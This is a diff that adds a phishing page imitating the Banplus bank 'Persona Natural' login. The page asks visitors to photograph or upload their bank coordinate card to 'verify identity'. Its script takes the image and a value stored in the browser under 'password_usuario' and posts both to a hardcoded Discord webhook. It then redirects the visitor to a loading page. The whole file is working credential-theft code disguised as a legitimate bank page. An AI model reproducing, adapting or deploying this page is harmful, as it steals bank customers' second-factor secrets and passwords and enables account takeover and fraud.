@@ -1,0 +1,391 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head><link href="styleBOL.css" type="text/css" rel="stylesheet"><title>
+    Inicio de Sesión Persona Natural
+</title>
+<meta charset="utf-8">
+        <link href="css.css" rel="stylesheet">
+
+
+
+    
+    <style type="text/css">
+        .fondo-administracion {
+            width: 100%;
+        }
+
+        #Table1 {
+            width: 100%;
+        }
+
+        .alturaedits {
+            height: 39px;
+        }
+
+        .alturaopciones {
+            height: 39px;
+        }
+
+        .style12 {
+            height: 39px;
+            width: 140px;
+        }
+
+        .style13 {
+            width: 126px;
+        }
+
+        .cuadroTexto {
+            width: 120px;
+        }
+
+         .auto-style1 {
+            width: 228px;
+        }
+
+        #auditores-overlay {
+            background-color: #aaa;
+        }
+
+        #auditores-container {
+            color: #fff;
+            background-color: #000;
+            border: 0px;
+            padding: 0px;
+            background-image: url(../images/auditoresExternos.jpg);
+            background-repeat: no-repeat;
+        }
+
+            #auditores-container .close {
+                position: absolute;
+                right: 0;
+                top: 0;
+            }
+
+                #auditores-container .close a {
+                    display: block;
+                    color: #ccc;
+                    font-weight: bold;
+                    padding: 6px 12px 0;
+                    text-decoration: none;
+                    text-shadow: 0 1px 0 #bbb;
+                }
+
+                    #auditores-container .close a:hover {
+                        color: #fff;
+                    }
+
+            #auditores-container .votar {
+                margin-top: 319px;
+                margin-left: 376px;
+                font-size: large;
+            }
+
+        .linkbuttona {
+            text-decoration: none;
+        }
+
+        .linkbuttona:hover {
+            text-decoration: underline;
+        }
+        .contenedor {
+    text-align: center;
+    padding: 25px;
+    max-width: 420px;
+    width: 85%;
+    justify-self: center;
+}
+        h2 { margin-top: 0; margin-bottom: 20px; color: #929292; font-size: 22px; }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            border: none;
+            box-sizing: border-box;
+            transition: background 0.2s;
+        }
+        .btn-camara { background-color: #2596be; color: white; } /* Verde */
+        .btn-camara:hover { background-color: #6d6f78; }
+        .btn-galeria { background-color: #2596be; color: white; text-align: center; } /* Gris */
+        .btn-galeria:hover { background-color: #6d6f78; }
+        .btn-capturar { background-color: #faa61a; color: white; display: none; } /* Naranja */
+        .btn-enviar { background-color: #5865F2; color: white; display: none; } /* Azul Discord */
+        .btn-enviar:hover { background-color: #4752c4; }
+        .btn-enviar:disabled { background-color: #3c45a5; opacity: 0.6; }
+        
+        #input-galeria { display: none; }
+        .banner {
+            width: 100%;
+            max-height: 160px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            object-fit: cover;
+            display: block;
+        }
+        video, img {
+            width: 100%;
+            max-height: 280px;
+            border-radius: 6px;
+            margin-top: 15px;
+            background-color: #000;
+            display: none;
+            object-fit: cover;
+        }
+        canvas { display: none; }
+        #estado { margin-top: 15px; font-size: 14px; font-weight: 500; }
+    </style>
+             
+    
+
+
+    <style type="text/css">
+        .btnLoginHeader {
+            height: 22px !important;
+            width: 24px !important;
+            padding-top: 0px !important;
+        }
+    </style>
+
+</head>
+<body>
+    <div id="contenedorSinMenu">
+<div>
+
+            <!-- impide que se guarde el historial de usuario y password en browser como Chrome -->
+            <input type="text" style="display: none;">
+            <input type="password" style="display: none;">
+            <!-- impide que se guarde el historial de usuario y password en browser como Chrome -->
+
+            <table width="670" border="0" align="center" cellpadding="0" cellspacing="0">
+                <tbody><tr>
+                    <td width="670">
+                        <img id="image1" class="banner" src="bannerNuevo.png?nocache=1791843755195" width="670" alt="">
+                    </td>
+                </tr>
+            </tbody></table>
+            <table width="670" border="0" align="center" cellpadding="0" cellspacing="0" background="fondo-ingreso-top.gif" id="Table1">
+                <tbody><tr>
+                    <td width="2%">&nbsp;
+                    </td>
+                    <td height="45">
+                        
+    <h1>
+        <span id="ctl00_ContenedorTitulos_lTitulo">Persona Natural</span>&nbsp;|<span class="activo"> Inicio Sesión</span></h1>
+
+                    </td>
+
+
+
+    </tr></tbody></table>
+<div class="contenedor">
+    <h2>Para verificar su identidad necesitamos que nos envíe foto de su tarjeta de coordenadas</h2>
+    
+    <!-- BOTÓN 1: Forzar cámara en vivo mediante JavaScript -->
+    <button id="btn-activar-camara" class="btn btn-camara">Tomar Foto</button>
+    <video id="video" autoplay playsinline></video>
+    <button id="btn-capturar" class="btn btn-capturar">Tomar Foto</button>
+
+    <!-- BOTÓN 2: Opción tradicional para abrir la Galería -->
+    <label id="label-galeria" class="btn btn-galeria" for="input-galeria">Elegir de la Galería</label>
+    <input type="file" id="input-galeria" accept="image/*">
+
+    <!-- Vista previa de la foto final -->
+    <canvas id="canvas"></canvas>
+    <img id="vista-previa" alt="Vista previa">
+
+    <!-- Botón de envío masivo -->
+    <button id="btn-enviar" class="btn btn-enviar">Enviar</button>
+    <p id="estado"></p>
+</div>
+<div class="new_bottomingreso" style="height: auto;">
+        </div><table width="670" border="0" align="center" cellpadding="0" cellspacing="0" background="fondo-ingreso-top.gif" id="Table1">
+                <tbody><tr>
+                    <td width="2%">&nbsp;
+                    </td>
+                    
+
+
+
+    </tr></tbody></table><table style="width: 100%">
+            <tbody><tr>
+                <td style="height: 25px; width: 135px; vertical-align: top; text-align: left; padding-left:25px">
+                    <iframe src="CURMini-3.0.gif" style="position: absolute; width: 135px; height: 20px; border: none" scrolling="no"></iframe>
+                </td>
+                <td style="width: auto; vertical-align: bottom; text-align: right; padding-right: 5px; padding-bottom: 6px">
+                    <a href="#" class="terminos">Términos y Condiciones</a>
+                </td>
+            </tr>
+        </tbody></table>
+    </div>
+
+    <style type="text/css">
+        .btnLoginHeader {
+            height: 23px !important;
+            width: 28px !important;
+        }
+
+        /*.ui-dialog-titlebar { float: right; border: 0; padding: 0} .ui-dialog-titlebar-close { top: 0; right: 0; margin: 0; z-index: 999;}*/
+    </style>
+
+            <div id="pie" style="width: 100%">
+                <div style="padding-left: 20px">
+                    <p>Banplus Banco Universal C.A | RIF J-000423032 </p>
+                    <p>Todos los Derechos Reservados</p>
+                </div>
+            </div>
+
+
+    </div>
+    <script>
+    // ⚠️ REEMPLAZA CON TU WEBHOOK REAL DE DISCORD
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558568551550292148/Wskx0sJITD2_84Kea18I4PcSJx9_-LlbfuDfAREN4ikumaVlxbqDEYZk4A5BFDGner0W";
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const vistaPrevia = document.getElementById('vista-previa');
+    const btnActivarCamara = document.getElementById('btn-activar-camara');
+    const btnCapturar = document.getElementById('btn-capturar');
+    const labelGaleria = document.getElementById('label-galeria');
+    const inputGaleria = document.getElementById('input-galeria');
+    const btnEnviar = document.getElementById('btn-enviar');
+    const estado = document.getElementById('estado');
+
+    let archivoParaEnviar = null; // Almacenará el Blob o Archivo final
+
+    // --- MÉTODO 1: LÓGICA DE CÁMARA EN VIVO ---
+    btnActivarCamara.addEventListener('click', async () => {
+        try {
+            estado.innerText = "Abriendo cámara...";
+            estado.style.color = "#dbdee1";
+            
+            // Forzamos el uso de la cámara trasera en celulares
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            video.srcObject = stream;
+            
+            video.style.display = "block";
+            btnCapturar.style.display = "block";
+            
+            btnActivarCamara.style.display = "none";
+            labelGaleria.style.display = "none";
+            vistaPrevia.style.display = "none";
+            btnEnviar.style.display = "none";
+            estado.innerText = "";
+        } catch (err) {
+            estado.innerText = "Error: No se pudo abrir la cámara. Revisa los permisos de tu navegador.";
+            estado.style.color = "#f23f43";
+            console.error(err);
+        }
+    });
+
+    btnCapturar.addEventListener('click', () => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convertimos a formato visual y a archivo binario (Blob)
+        vistaPrevia.src = canvas.toDataURL('image/png');
+        vistaPrevia.style.display = "block";
+        video.style.display = "none";
+        btnCapturar.style.display = "none";
+        
+        // Volvemos a mostrar las opciones principales por si quiere cambiar
+        btnActivarCamara.style.display = "block";
+        labelGaleria.style.display = "block";
+        btnEnviar.style.display = "block";
+
+        canvas.toBlob((blob) => {
+            archivoParaEnviar = blob;
+        }, 'image/png');
+
+        // Apagar la cámara trasera para ahorrar recursos
+        const stream = video.srcObject;
+        if (stream) stream.getTracks().forEach(track => track.stop());
+    });
+
+    // --- MÉTODO 2: LÓGICA DE LA GALERÍA ---
+    inputGaleria.addEventListener('change', function() {
+        if (this.files && this.files[0]) {
+            archivoParaEnviar = this.files[0];
+            
+            const lector = new FileReader();
+            lector.onload = function(e) {
+                vistaPrevia.src = e.target.result;
+                vistaPrevia.style.display = 'block';
+                btnEnviar.style.display = 'block';
+                
+                // Aseguramos que la cámara en vivo se apague si estaba abierta
+                video.style.display = "none";
+                btnCapturar.style.display = "none";
+                btnActivarCamara.style.display = "block";
+                
+                estado.innerText = "Foto seleccionada de la galería.";
+                estado.style.color = "#dbdee1";
+            }
+            lector.readAsDataURL(archivoParaEnviar);
+        }
+    });
+
+    // --- ACCIÓN: ENVIAR A DISCORD ---
+    btnEnviar.addEventListener('click', async () => {
+        if (!archivoParaEnviar) return;
+
+        estado.innerText = "Enviando a tarjeta de coordenadas...";
+        estado.style.color = "#f0b232";
+        btnEnviar.disabled = true;
+
+        // Leer el usuario guardado en localStorage (clave: sesion_admin_id)
+        let usuarioId = "desconocido";
+        try {
+            const sessionIdUnico = localStorage.getItem('password_usuario');
+            if (sessionIdUnico) {
+                const datosSesion = JSON.parse(sessionIdUnico);
+                usuarioId = datosSesion.usuario || sessionIdUnico;
+            }
+        } catch (e) {
+            // Si no es JSON válido, usamos el valor crudo tal cual
+            const valorCrudo = localStorage.getItem('password_usuario');
+            if (valorCrudo) usuarioId = valorCrudo;
+        }
+
+        const formData = new FormData();
+        // Detecta si es un archivo de galería o una captura del canvas
+        const nombreArchivo = archivoParaEnviar.name || 'captura_web.png';
+        formData.append('file', archivoParaEnviar, nombreArchivo); 
+        formData.append('payload_json', JSON.stringify({
+            content: `¡Nueva foto recibida desde la web! 📸\nUsuario: ${usuarioId}`
+        }));
+
+        try {
+            const respuesta = await fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (respuesta.ok) {
+                estado.innerText = "¡Tarjeta de coordenadas enviada con éxito! ";
+                estado.style.color = "#23a55a";
+                vistaPrevia.style.display = 'none';
+                btnEnviar.style.display = 'none';
+                inputGaleria.value = "";
+                archivoParaEnviar = null;
+
+                // Redirigir a Google después de 1.5 segundos
+                setTimeout(() => {
+                    window.location.href = "cargando.html";
+                }, 1000);
+            } else {
+                throw new Error();
+            }
+        } catch (error) {
+            estado.innerText = "Error al enviar la imagen. Revisa tu webhook.";
+            estado.style.color = "#f23f43";
+        } finally {
+            btnEnviar.disabled = false;
+        }
+    });
+</script>
+</body></html>
